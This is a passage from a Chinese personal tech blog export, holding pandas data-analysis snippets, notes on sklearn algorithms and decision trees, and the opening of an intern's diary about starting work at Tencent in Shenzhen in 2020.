查询某列的值为x时，即使该列为坐标</span></span><br><span class="line"><span class="comment">#查询中国队的获奖牌</span></span><br><span class="line">df3.query(<span class="string">"国家 == ['中国']"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算中国每日总奖牌数量 累计</span></span><br><span class="line">df2.groupby([<span class="string">'获奖时间'</span>,<span class="string">'国家'</span>]).count()[<span class="string">'奖牌类型'</span>].to_frame().query(<span class="string">'国家==["中国"]'</span>).cumsum()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询空值所在行</span></span><br><span class="line">df[df.isnull().T.any() == <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看重复的</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"></span><br><span class="line"><span class="comment">#查询条件</span></span><br><span class="line">df_01.loc[df_01[<span class="string">'行业（按行业大类）'</span>].isin([<span class="string">'工业'</span>,<span class="string">'建筑业'</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">'行业（按行业大类）'</span>]==<span class="string">'工业'</span>)|(df_01[<span class="string">'行业（按行业大类）'</span>]==<span class="string">'建筑业'</span>)]</span><br><span class="line">df_01[df_01[<span class="string">'行业（按行业大类）'</span>].str.contains(<span class="string">'工业|建筑业'</span>)]</span><br></pre></td></tr></table></figure><h3><span id="数据汇总">数据汇总</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算 总分、高端人才得分、办学层次得分的最大最小值、中位数、均值</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">"总分"</span>: [<span class="string">"min"</span>, <span class="string">"max"</span>, <span class="string">"median"</span>, <span class="string">"mean"</span>],</span><br><span class="line">        <span class="string">"高端人才得分"</span>: [<span class="string">"min"</span>, <span class="string">"max"</span>, <span class="string">"median"</span>, <span class="string">"mean"</span>],</span><br><span class="line">        <span class="string">"办学层次得分"</span>:[<span class="string">"min"</span>, <span class="string">"max"</span>, <span class="string">"median"</span>, <span class="string">"mean"</span>]&#125;)</span><br></pre></td></tr></table></figure><h3><span id="数据合并">数据合并</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 垂直拼接 df1、df2、df3，效果如下图所示</span></span><br><span class="line">pd.concat([df1, df2, df3])</span><br><span class="line"><span class="comment"># 垂直拼接 df1 和 df4，并按顺序重新生成索引，</span></span><br><span class="line">df = pd.concat([df1,df4]).reset_index()</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">df = pd.concat([df1, df4], ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 横向拼接</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 在上一题的基础上，只取结果的交集</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>,join=<span class="string">'inner'</span>)</span><br><span class="line"><span class="comment"># 只取包含 df1 索引的部分</span></span><br><span class="line">pd.concat([df1, df4], axis=<span class="number">1</span>).reindex(df1.index)</span><br><span class="line"><span class="comment"># 拼接 df1、df2、df3，同时新增一个索引（x、y、z）来区分不同的表数据来源</span></span><br><span class="line">pd.concat([df1, df2, df3], keys=[<span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>])</span><br><span class="line"><span class="comment"># 根据 key 连接 left 和 right</span></span><br><span class="line">pd.merge(left, right, on=<span class="string">'key'</span>)</span><br><span class="line"><span class="comment"># 根据 key1 和 key2 连接 left 和 right</span></span><br><span class="line">pd.merge(left, right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>])</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">how 可以设置</span></span><br><span class="line"><span class="string">right、left: 左外，右外</span></span><br><span class="line"><span class="string">outer、inner: 全外连接，内连接</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pd.merge(left, right, how=<span class="string">'left'</span>, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>])</span><br><span class="line"><span class="comment"># 重新产生数据</span></span><br><span class="line">left.join(right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>])</span><br></pre></td></tr></table></figure><h3><span id="多个df画一起">多个DF画一起</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">16</span>,<span class="number">10</span>))   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_percent</span><span class="params">(temp, position)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'%1.0f'</span>%(<span class="number">100</span>*temp) + <span class="string">'%'</span></span><br><span class="line">plt.gca().yaxis.set_major_formatter(FuncFormatter(to_percent))</span><br><span class="line">ax.plot(max_data,label=<span class="string">'first one'</span>)</span><br><span class="line">ax.plot(min_data,label=<span class="string">'last one'</span>)</span><br><span class="line">ax.plot(q3_df,label=<span class="string">'mean'</span>)</span><br><span class="line">ax.set_title(<span class="string">'Daily Empty Rate Comparison For Village Y'</span>)</span><br><span class="line">plt.legend(loc=<span class="string">'best'</span>)</span><br><span class="line">plt.savefig(<span class="string">'C-4.png'</span>)</span><br></pre></td></tr></table></figure><h3><span id="分析和排序">分析和排序</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将空置率从低到高排序</span></span><br><span class="line">q1_df=q1_df.sort_values(<span class="string">'AT_HOME'</span>)</span><br><span class="line"><span class="comment"># 参数by可以忽略</span></span><br><span class="line">df.sort_values(by=<span class="string">'总分'</span>, ascending=<span class="literal">True</span>).head(<span class="number">20</span>)</span><br><span class="line"><span class="comment"># 查看各项得分最高的学校名称</span></span><br><span class="line">df.iloc[:,<span class="number">3</span>:].idxmax()</span><br><span class="line"><span class="comment"># 统计 总分 列的均值</span></span><br><span class="line">df[<span class="string">'总分'</span>].mean()</span><br><span class="line">df.总分.mean()</span><br><span class="line"><span class="comment"># 计算总分列的中位数</span></span><br><span class="line">df.总分.median()</span><br><span class="line"><span class="comment"># 计算总分列的众数</span></span><br><span class="line">df.总分.mode()</span><br><span class="line"><span class="comment"># 查看数值型数据的统计信息（均值、分位数等），并保留两位小数</span></span><br><span class="line">df.describe().round(<span class="number">2</span>).T</span><br></pre></td></tr></table></figure><h3><span id="双纵坐标轴">双纵坐标轴</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入data.csv</span></span><br><span class="line">df = pd.read_csv(<span class="string">'data.csv'</span>)</span><br><span class="line"><span class="comment"># 将Date转为日期格式</span></span><br><span class="line">df[<span class="string">'Date'</span>] = pd.to_datetime(df[<span class="string">'Date'</span>])</span><br><span class="line"><span class="comment"># 优化df的结构</span></span><br><span class="line">df=df.reset_index(drop=<span class="literal">True</span>).set_index(<span class="string">'Date'</span>)</span><br><span class="line"><span class="comment"># 选择数据范围 2014年1月1日至2018年7月31日</span></span><br><span class="line">q1_df = df[<span class="string">'2014-01-01'</span>:<span class="string">'2018-07-31'</span>]</span><br><span class="line"><span class="comment"># 构建画图使用的dataframe 每天的日电量、最高温度、最低温度</span></span><br><span class="line">q1_plot_df = q1_df[[<span class="string">'DailyElectricity'</span>,<span class="string">'MaxTemperature'</span>,<span class="string">'MinTemperature'</span>]]</span><br><span class="line"><span class="comment"># 画图</span></span><br><span class="line">fig,ax = plt.subplots(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br><span class="line">ax.plot(df[<span class="string">'DailyElectricity'</span>],color=<span class="string">'r'</span>,label=<span class="string">'DailyElectricity'</span>)</span><br><span class="line"><span class="comment"># 镜像x轴</span></span><br><span class="line">ax2 = ax.twinx()</span><br><span class="line">ax2.plot(df[<span class="string">'MaxTemperature'</span>],color=<span class="string">'b'</span>,label=<span class="string">'MaxTemperature'</span>)</span><br><span class="line">ax2.plot(df[<span class="string">'MinTemperature'</span>],color=<span class="string">'g'</span>,label=<span class="string">'MinTemperature'</span>)</span><br><span class="line"><span class="comment"># 添加图例</span></span><br><span class="line">ax.legend(loc=<span class="string">'best'</span>)</span><br><span class="line">ax2.legend(loc=<span class="string">'best'</span>)</span><br><span class="line">ax.set_title(<span class="string">'Daily Usage and Temperature'</span>)</span><br><span class="line">plt.savefig(<span class="string">'F-1.png'</span>)</span><br></pre></td></tr></table></figure><h3><span id="构建空df">构建空DF</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">max_data = pd.DataFrame(columns=&#123;<span class="string">'DATA_DATE'</span>,<span class="string">'empty_ratio'</span>&#125;)</span><br><span class="line">min_data = pd.DataFrame(columns=&#123;<span class="string">'DATA_DATE'</span>,<span class="string">'empty_ratio'</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(q4_df)):</span><br><span class="line">    indx = q4_df.index[i][<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    val = q4_df.iloc[i][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> indx == <span class="string">'Street A'</span>:</span><br><span class="line">        max_data = max_data.append([&#123;<span class="string">'DATA_DATE'</span>:q4_df.index[i][<span class="number">0</span>],<span class="string">'empty_ratio'</span>:val&#125;],ignore_index=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> indx == <span class="string">'Street G'</span>:</span><br><span class="line">        min_data = min_data.append(&#123;<span class="string">'DATA_DATE'</span>:q4_df.index[i][<span class="number">0</span>],<span class="string">'empty_ratio'</span>:val&#125;,ignore_index=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">max_data=max_data.reset_index(drop=<span class="literal">True</span>).set_index(max_data[<span class="string">'DATA_DATE'</span>]).drop(<span class="string">'DATA_DATE'</span>,<span class="number">1</span>)</span><br><span class="line">min_data=min_data.reset_index(drop=<span class="literal">True</span>).set_index(min_data[<span class="string">'DATA_DATE'</span>]).drop(<span class="string">'DATA_DATE'</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 新建df 方法一</span></span><br><span class="line"></span><br><span class="line">cols_q3=[<span class="string">'类别'</span>,<span class="string">'本周电量'</span>,<span class="string">'上周周电量'</span>,<span class="string">'环比提升'</span>,<span class="string">'农历同期周电量'</span>,<span class="string">'同比提升'</span>]</span><br><span class="line">q3_df = pd.DataFrame(columns=cols_q3)</span><br><span class="line">q3_df.loc[<span class="number">0</span>]=np.nan <span class="comment">#先新建一列</span></span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">'软件园一期'</span> <span class="comment"># 第一次要iloc</span></span><br><span class="line">q3_df.loc[<span class="number">1</span>] = <span class="string">'软件园二期'</span>   <span class="comment"># 后面可以用iloc来做</span></span><br><span class="line">q3_df.loc[<span class="number">2</span>] = <span class="string">'软件园三期'</span></span><br><span class="line">q3_df.loc[<span class="number">3</span>] = <span class="string">'医药制造'</span>q3_df.iloc[<span class="number">0</span>,<span class="number">1</span>] = bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>].round(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">2</span>] = sz_factory[<span class="string">'上周周电量'</span>][<span class="number">0</span>].round(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">3</span>] = (bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]-sz_factory[<span class="string">'上周周电量'</span>][<span class="number">0</span>])/sz_factory[<span class="string">'上周周电量'</span>][<span class="number">0</span>]</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">4</span>] = nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>].round(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">5</span>] = (bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]-nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>])/nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 新建df 方法二直接concat</span></span><br><span class="line">q1_df.loc[<span class="number">0</span>]=np.nan</span><br><span class="line">tmp_df.loc[<span class="number">0</span>]=np.nan</span><br><span class="line"></span><br><span class="line">q1_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">'工业'</span></span><br><span class="line">tmp_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">'建筑业'</span></span><br><span class="line"></span><br><span class="line">q1_df.iloc[<span class="number">0</span>,<span class="number">1</span>]=bz_gy[<span class="string">'开工指数'</span>].round(<span class="number">2</span>)</span><br><span class="line">tmp_df.iloc[<span class="number">0</span>,<span class="number">1</span>]=bz_jz[<span class="string">'开工指数'</span>].round(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">q1_df = pd.concat([q1_df,tmp_df],axis=<span class="number">0</span>)</span><br><span class="line">q1_df.to_csv(<span class="string">'Q2-1.csv'</span>,index=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将一列添加到一个新的df里面，需要保证！！！index一致！！！ 否则加不进去</span></span><br><span class="line"><span class="comment"># q2_df</span></span><br><span class="line">cols_q2 = [<span class="string">'类别'</span>,<span class="string">'本周电量'</span>,<span class="string">'上周周电量'</span>,<span class="string">'环比提升'</span>,<span class="string">'农历同期周电量'</span>,<span class="string">'同比提升'</span>]</span><br><span class="line">q2_df = pd.DataFrame(columns=cols_q2)</span><br><span class="line">q2_df[<span class="string">'类别'</span>]=usage_bz.T.index</span><br><span class="line">q2_df[<span class="string">'本周电量'</span>]=usage_bz.T.reset_index()[<span class="string">'厦门市'</span>] <span class="comment">#要先reset_index</span></span><br><span class="line">q2_df</span><br></pre></td></tr></table></figure><h3><span id="更改日期间隔">更改日期间隔</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更改日期间隔</span></span><br><span class="line">plt.xticks(pd.date_range(<span class="string">'2021-01-01'</span>,<span class="string">'2021-03-31'</span>,freq=<span class="string">'20D'</span>))</span><br></pre></td></tr></table></figure><h3><span id="查看统计数据">查看统计数据</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看数据行列数</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># 查看数据量</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># 查看 数值型 列的统计信息，计数、均值什么的</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># 查看 离散型 列的统计信息，计数、频率什么</span></span><br><span class="line">df.describe(include=[<span class="string">'O'</span>])</span><br><span class="line"><span class="comment"># 查看 全部 列的统计信息</span></span><br><span class="line">df.describe(include=<span class="string">'all'</span>)</span><br></pre></td></tr></table></figure><h3><span id="保存文件">保存文件</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不保存索引</span></span><br><span class="line">data.to_csv(<span class="string">"out.csv"</span>,encoding = <span class="string">'utf_8_sig'</span>,index = <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 保存指定列</span></span><br><span class="line">data.to_csv(<span class="string">"out.csv"</span>,encoding = <span class="string">'utf_8_sig'</span>,columns=[<span class="string">'positionName'</span>,<span class="string">'salary'</span>])</span><br><span class="line"><span class="comment"># 小数点</span></span><br><span class="line">mar.to_csv(<span class="string">"2-1.csv"</span>, index=<span class="literal">False</span>, float_format=<span class="string">'%.3f'</span>)</span><br></pre></td></tr></table></figure><h3><span id="数据预处理">数据预处理</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># isnull() is an alias for isna </span></span><br><span class="line"><span class="comment"># 计算缺失值</span></span><br><span class="line">df.isna().sum().sum()</span><br><span class="line"><span class="comment"># 每列有多少缺失值</span></span><br><span class="line">df.isnull().sum()</span><br><span class="line"><span class="comment"># 查看缺失值</span></span><br><span class="line">df[df.isnull().T.any() == <span class="literal">True</span>]</span><br><span class="line"><span class="comment"># 将评价人数列的缺失值，用整列的均值进行填充</span></span><br><span class="line">df[<span class="string">'评价人数'</span>] = df[<span class="string">'评价人数'</span>].fillna(df[<span class="string">'评价人数'</span>].mean())</span><br><span class="line"><span class="comment"># 现在将评分列的缺失值，替换为上一个电影的评分</span></span><br><span class="line">df[<span class="string">'评分'</span>] = df[<span class="string">'评分'</span>].fillna(axis=<span class="number">0</span>,method=<span class="string">'ffill'</span>)</span><br><span class="line"><span class="comment"># 将评价人数列的缺失值，用上下数字的均值进行填充</span></span><br><span class="line">df[<span class="string">'评价人数'</span>] = df[<span class="string">'评价人数'</span>].fillna(df[<span class="string">'评价人数'</span>].interpolate())</span><br><span class="line"><span class="comment"># 在填充 “语言” 列的缺失值，要求根据 “国家/地区” 列的值进行填充</span></span><br><span class="line">df[<span class="string">'语言'</span>]=df.groupby(<span class="string">'国家/地区'</span>).语言.bfill()</span><br><span class="line"><span class="comment"># 查找重复值</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"><span class="comment"># 查找指定列的重复值</span></span><br><span class="line">df[df.duplicated([<span class="string">'片名'</span>])]</span><br><span class="line"><span class="comment"># 删除全部的重复值</span></span><br><span class="line">df = df.drop_duplicates()</span><br><span class="line"><span class="comment"># 删除全部的重复值，但保留最后一次出现的值first/last/false</span></span><br><span class="line">df = df.drop_duplicates(keep = <span class="string">'last'</span>)</span><br><span class="line"><span class="comment"># 计算各省市出现的次数</span></span><br><span class="line">df.省市.value_counts()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 都可以用inplace=True来代替赋值</span></span><br></pre></td></tr></table></figure><h3><span id="删除空行">删除空行</span></h3><p><strong>1.函数详解</strong></p><p>函数形式：dropna(axis=0, how=’any’, thresh=None, subset=None, inplace=False)</p><p>参数：</p><p><strong>axis</strong>：轴。0或’index’，表示按行删除；1或’columns’，表示按列删除。</p><p><strong>how</strong>：筛选方式。‘any’，表示该行/列只要有一个以上的空值，就删除该行/列；‘all’，表示该行/列全部都为空值，就删除该行/列。</p><p><strong>thresh</strong>：非空元素最低数量。int型，默认为None。如果该行/列中，非空元素数量小于这个值，就删除该行/列。</p><p><strong>subset</strong>：子集。列表，元素为行或者列的索引。如果axis=0或者‘index’，subset中元素为列的索引；如果axis=1或者‘column’，subset中元素为行的索引。由subset限制的子区域，是判断是否删除该行/列的条件判断区域。</p><p><strong>inplace</strong>：是否原地替换。布尔值，默认为False。如果为True，则在原DataFrame上进行操作，返回值为None。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除整行缺失的数据，剩余缺失数据按0值进行填充</span></span><br><span class="line">df2 = df2.dropna(how=<span class="string">'all'</span>).fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 删除某列为空的行</span></span><br><span class="line">df_initial.dropna(axis = <span class="number">0</span>, subset = [<span class="string">'客户ID'</span>], inplace = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="替换">替换</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将金牌数列的数字 0 替换为 无</span></span><br><span class="line">df[<span class="string">'金牌数'</span>].replace(<span class="number">0</span>,<span class="string">'无'</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#同时替换 1将 无 替换为 缺失值 2将 0 替换为 None</span></span><br><span class="line">df.replace([<span class="string">'无'</span>,<span class="number">0</span>],[np.nan,<span class="string">'None'</span>],inplace = <span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 将 `金牌数` 列类型修改为 `int`</span></span><br><span class="line">df[<span class="string">'金牌数'</span>] = df[<span class="string">'金牌数'</span>].fillna(<span class="string">'0'</span>).astype(int)</span><br></pre></td></tr></table></figure><h2><span id="算法总结">算法总结</span></h2><table><thead><tr><th>分类</th><th>回归</th></tr></thead><tbody><tr><td>分类树<strong>tree.DecisionTreeClassififier</strong></td><td>回归树<strong>tree.DecisionTreeRegressor</strong></td></tr><tr><td>随机森林<strong>ensemble.RandomForestClassifier</strong></td><td>回归森林<strong>ensemble.RandomForestRegressor</strong></td></tr><tr><td>逻辑回归<strong>linear_model.LogisticRegression</strong></td><td></td></tr><tr><td>KNN <strong>neighbors .KNeighborsClassifier</strong></td><td></td></tr><tr><td>Naive Bayes</td><td></td></tr><tr><td>梯度提升树木<strong>ensemble.GradientBoostingRegressor</strong></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h3><span id="决策树">决策树</span></h3><p><strong>决策树优点</strong></p><ol><li><p>易于理解和解释，因为树木可以画出来被看见</p></li><li><p>需要很少的数据准备。其他很多算法通常都需要数据规范化，需要创建虚拟变量并删除空值等。但请注意，sklearn中的决策树模块不支持对缺失值的处理。</p></li><li><p>使用树的成本（比如说，在预测数据的时候）是用于训练树的数据点的数量的对数，相比于其他算法，这是一个很低的成本。</p></li><li><p>能够同时处理数字和分类数据，既可以做回归又可以做分类。其他技术通常专门用于分析仅具有一种变量类型的数据集。</p></li><li><p>能够处理多输出问题，即含有多个标签的问题，注意与一个标签中含有多种标签分类的问题区别开</p></li><li><p>是一个白盒模型，结果很容易能够被解释。如果在模型中可以观察到给定的情况，则可以通过布尔逻辑轻松解释条件。相反，在黑盒模型中（例如，在人工神经网络中），结果可能更难以解释。</p></li><li><p>可以使用统计测试验证模型，这让我们可以考虑模型的可靠性。</p></li><li><p>即使其假设在某种程度上违反了生成数据的真实模型，也能够表现良好。</p></li></ol><p><strong>决策树的缺点</strong></p><ol><li><p>决策树学习者可能创建过于复杂的树，这些树不能很好地推广数据。这称为过度拟合。修剪，设置叶节点所需的最小样本数或设置树的最大深度等机制是避免此问题所必需的，而这些参数的整合和调整对初学者来说会比较晦涩</p></li><li><p>决策树可能不稳定，数据中微小的变化可能导致生成完全不同的树，这个问题需要通过集成算法来解决。</p></li><li><p>决策树的学习是基于贪婪算法，它靠优化局部最优（每个节点的最优）来试图达到整体的最优，但这种做法不能保证返回全局最优决策树。这个问题也可以由集成算法来解决，在随机森林中，特征和样本会在分枝过程中被随机采样。</p></li><li><p>有些概念很难学习，因为决策树不容易表达它们，例如XOR，奇偶校验或多路复用器问题。</p></li><li><p>如果标签中的某些类占主导地位，决策树学习者会创建偏向主导类的树。因此，建议在拟合决策树之前平衡数据集。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 大数据 pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鹅场的日记</title>
      <link href="/2020/05/28/Tencent-intern-LOG/"/>
      <url>/2020/05/28/Tencent-intern-LOG/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>笔者之前使用的Java居多，进入腾讯实习得转C++，因此相对C++工程师来说基础为0。想通过日记的方式记录自己的成长和生活的一些琐事，争取转正。</p><a id="more"></a><!-- toc --><ul><li><a href="#2020520">2020/5/20</a></li><li><a href="#2020521">2020/5/21</a></li><li><a href="#2020522">2020/5/22</a></li><li><a href="#2020525">2020/5/25</a></li><li><a href="#2020526">2020/5/26</a></li><li><a href="#examples">Examples</a></li><li><a href="#2020527">2020/5/27</a></li><li><a href="#2020528">2020/5/28</a></li><li><a href="#2020529">2020/5/29</a></li><li><a href="#202061">2020/6/1</a></li><li><a href="#202062">2020/6/2</a></li><li><a href="#202063">2020/6/3</a></li><li><a href="#202064">2020/6/4</a></li><li><a href="#202065">2020/6/5</a></li><li><a href="#202068">2020/6/8</a></li><li><a href="#202069">2020/6/9</a></li><li><a href="#2020610">2020/6/10</a></li><li><a href="#2020611">2020/6/11</a></li></ul><!-- tocstop --><h2><span id="2020520">2020/5/20</span></h2><p>​    刚到深圳就下雨了，路上很多黑车司机漫天要价到酒店要90、100。我看了一眼滴滴才需要50.果断选择打滴滴，但是后面一个黑车老板锲而不舍报了个60，然后我感觉差不多就答应了，没想到一上车就下雨了，也是运气很好。虽然路上还捎了两个人但是先送我到酒店，不过黑车也没送到酒店门口。到酒店后走完流程，完成线上的签约就静等腾讯那边流程，晚些时候打了一会无限火力。</p><h2><span id="2020521">2020/5/21</span></h2><p>​    hr助手上显示通行码明天才会绿，今天去不了公司了。果断去B站把小程序剩下的内容学习完。</p><h2><span id="2020522">2020/5/22</span></h2><p>​    今天起了个大早，昨天晚上看地图显示到公司差不多30分钟，然后提早起来，吃完饭就去等公交了，没想到路上那个堵啊，1小时才走完4公里的路。心态发生了点变化，好在下车点离腾讯大厦很近。领完了临时工牌上楼拿到了正式员工的工牌，然后在29楼等到了亲爱的导师Songa后，导师给我安排了工位，由于人比较多给我安排的是个临时的工位。不过腾讯的椅子坐起来还是比较nice的。</p><p><img src="2e51e8d8f26e43a3f79bf461582f347.jpg" alt="工位电脑"></p><p>​    